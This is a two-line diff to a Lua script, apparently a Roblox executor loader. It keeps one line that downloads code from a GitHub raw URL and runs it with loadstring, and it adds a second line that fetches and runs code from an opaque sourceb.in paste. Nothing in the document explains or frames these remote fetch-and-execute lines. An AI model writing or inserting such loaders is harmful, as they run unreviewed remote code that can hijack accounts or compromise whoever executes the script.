@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/abgsweryoat/abgscript/refs/heads/main/asdasdasdas"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/SFsqlUs1PR/0", true))()
